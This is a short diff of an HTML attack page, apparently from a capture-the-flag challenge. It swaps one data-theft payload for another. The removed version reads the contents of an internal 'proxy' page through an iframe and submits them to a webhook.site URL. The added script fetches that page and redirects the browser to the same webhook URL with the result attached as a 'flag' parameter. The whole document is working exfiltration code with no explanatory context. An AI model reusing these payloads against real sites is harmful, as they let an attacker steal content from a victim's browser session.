@@ -1,14 +1,12 @@
-<!DOCTYPE html>
 <html>
-<body>
-<form action="https://webhook.site/9cf23925-1943-4d85-9be5-56a8ca40c833" method="POST" id="exfil">
-  <textarea name="leak" id="leak"></textarea>
-</form>
-
-<iframe src="http://proxy/" onload="
-  document.getElementById('leak').value=this.contentDocument.body.innerText;
-  document.getElementById('exfil').submit();
-"></iframe>
-
-</body>
+  <body>
+    <script>
+      // redirect ke proxy, ambil isi, lalu kirim
+      fetch("http://proxy/")
+        .then(r => r.text())
+        .then(flag => {
+          location.href = "https://webhook.site/9cf23925-1943-4d85-9be5-56a8ca40c833/?flag=" + encodeURIComponent(flag);
+        });
+    </script>
+  </body>
 </html>
